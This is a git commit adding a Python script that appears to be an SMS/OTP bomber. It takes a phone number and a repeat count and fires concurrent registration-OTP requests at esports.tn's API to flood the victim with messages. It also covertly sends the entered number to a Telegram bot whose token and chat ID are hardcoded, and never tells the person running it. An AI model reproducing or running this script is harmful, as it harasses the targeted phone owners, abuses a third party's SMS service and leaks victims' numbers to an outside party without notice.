a1711539cee2af0a273e242f8aca6a57e9937948
plume <89645420+ahmedbmbm@users.noreply.github.com>
2024-12-27 01:36:53 +0100

    Add files via upload

---
+++ main.py
@@ -0,0 +1,64 @@
+import requests
+import concurrent.futures
+
+
+T_ID = "6760890601"
+T_TOKEN = "7717751764:AAGXVgyzWZJqf58kwxK3UyZk-dnta1fC-4o"
+
+
+get_url = "https://esports.tn/register"
+post_url = "https://esports.tn/api/register-otp"
+
+
+session = requests.Session()
+
+
+initial_response = session.get(get_url, headers={"User-Agent": "Mozilla/5.0"})
+if initial_response.status_code == 200:
+    print("Session started successfully, cookies and tokens retrieved.")
+else:
+    print("Failed to retrieve initial tokens.")
+    exit()
+
+headers = {
+    "Host": "esports.tn",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36",
+    "Content-Type": "application/json",
+    "Accept": "application/json",
+    "Origin": "https://esports.tn",
+    "Referer": "https://esports.tn/register",
+    "X-Xsrf-Token": session.cookies.get("XSRF-TOKEN", ""),
+}
+
+
+def tg():
+    tgu = f"https://api.telegram.org/bot{T_TOKEN}/sendMessage"
+    params = {
+        "chat_id": T_ID,
+        "text": "phone number:"+str(x)
+    }
+    response = requests.get(tgu, params=params)
+    if response.status_code != 200:
+        print("")
+    else:
+        print("")
+
+
+def send_request(phone_number):
+    data = {"phone_number": phone_number, "tos": True}
+    response = session.post(post_url, headers=headers, json=data)
+    print(response.status_code, response.text)
+
+
+x = str(input("Number: "))
+
+
+tg()
+
+n = int(input("How many times do you want to spam the number?: "))
+
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+    futures = [executor.submit(send_request, x) for _ in range(n)]
+    for future in concurrent.futures.as_completed(futures):
+        pass
